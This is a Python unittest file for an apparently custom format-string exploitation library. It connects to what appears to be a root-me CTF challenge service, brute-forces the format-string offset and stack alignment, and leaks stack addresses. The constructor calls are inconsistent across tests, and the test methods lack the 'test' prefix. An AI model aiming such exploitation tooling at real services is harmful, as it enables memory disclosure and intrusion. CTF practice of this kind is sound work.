import unittest
import sys
import os
sys.path.insert(0, os.path.abspath(os.path.join(os.path.dirname(__file__), '../../src')))

from dispatcher import Dispatcher
from exploit.string_bug import FormatStringExploit

"""
mode: web
url: challenge02.root-me.org
port: 56003
"""

class TestWebNoneStackAlignment(unittest.TestCase):
    def FindOffsetTest(self):
        """
        Test the format string exploit on a web service with no stack alignment.
        This test connects to the service, sends a format string command, and checks for the expected
        """
        print("Running WorkingTest...")
        self.config = {
            'mode': 'web',
            'url': 'challenge02.root-me.org',
            'port': 56003,
            'verbose': False}
        self.dispatcher = Dispatcher(self.config)
        self.exploit = FormatStringExploit(self.config, self.dispatcher)
        self.exploit.setup_init_instructions([
            ("recv", 4096),
            ("send", "toto"),
            ("recv", 4096),
            ("send", "titi"),
            ("recv", 4096)
        ])
        self.dispatcher.connect()
        self.exploit.launch_init_instructions()
        offset, stack_alignment = self.exploit.find_offset(max_offset=100, delay_between_request=0.1, connect_and_close=False, retry_on_error=False)
        self.assertEqual(offset, 5)
        self.assertEqual(stack_alignment, 0)
        self.exploit.update_offset_and_stack_alignment(offset, stack_alignment)
        self.assertEqual(self.exploit.offset, 5)
        self.assertEqual(self.exploit.stack_alignment, 0)

    def ForgetConnectTest(self):
        """
        Test the format string exploit without connecting to the service.
        This test should raise a ValueError when trying to send commands without connecting.
        """
        print("Running ForgetConnectTest...")
        self.dispatcher = Dispatcher({
            'mode': 'web',
            'url': 'challenge02.root-me.org',
            'port': 56003,
            'verbose': False}
            )
        self.exploit = FormatStringExploit(self.dispatcher, verbose=False)
        self.exploit.setup_init_instructions([
            ("recv", 4096),
            ("send", "toto"),
            ("recv", 4096),
            ("send", "titi"),
            ("recv", 4096)
        ])
        try:
            self.exploit.launch_init_instructions()
        except ValueError as e:
            self.assertEqual(str(e), "Instructions not set up or client not connected. Call setup_init_instructions() or connect() first.")
        offset, stack_alignment = self.exploit.find_offset(max_offset=100, delay_between_request=0.1, connect_and_close=False, retry_on_error=False)
        self.assertEqual(offset, None)
        self.assertEqual(stack_alignment, None)

    def FindStackAddresses(self):
        """
        Test the format string exploit to find stack addresses.
        This test connects to the service, sends a format string command, and checks for the expected
        stack addresses.
        """
        print("Running FindStackAddresses...")
        self.dispatcher = Dispatcher({
            'mode': 'web',
            'url': 'challenge02.root-me.org',
            'port': 56003,
            'verbose': False}
            )
        self.exploit = FormatStringExploit(self.dispatcher, verbose=True)
        self.exploit.setup_init_instructions([
            ("recv", 4096),
            ("send", "toto"),
            ("recv", 4096),
            ("send", "titi"),
            ("recv", 4096)
        ])
        self.dispatcher.connect()
        self.exploit.launch_init_instructions()
        offset, stack_alignment = self.exploit.find_offset(max_offset=100, delay_between_request=0.1, connect_and_close=False, retry_on_error=False)
        self.exploit.update_offset_and_stack_alignment(offset, stack_alignment)
        addresses = self.exploit.return_stack_addresses()
        self.assertTrue(len(addresses) > 0)
        print("Found stack addresses:", addresses)
        
if __name__ == "__main__":
    unittest.main()